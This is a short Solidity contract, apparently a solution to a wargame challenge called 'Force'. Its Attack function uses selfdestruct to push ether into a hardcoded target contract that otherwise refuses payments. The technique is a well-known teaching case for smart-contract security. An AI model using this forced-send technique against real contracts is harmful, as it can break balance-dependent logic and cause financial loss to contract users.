// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttack{

    fallback() external {}

    //recieve is used when eth is sent with no calldata
    receive() external payable {
  }
    
    function Attack() external{
        //Give the address of the Force Contract Instance as the recipiant of the self Destruct ether
        address payable addr = payable(address(0x7AbC582C30451d58a2fB0DDed0aC024dBfB73498)); 
        selfdestruct(addr);
    }
}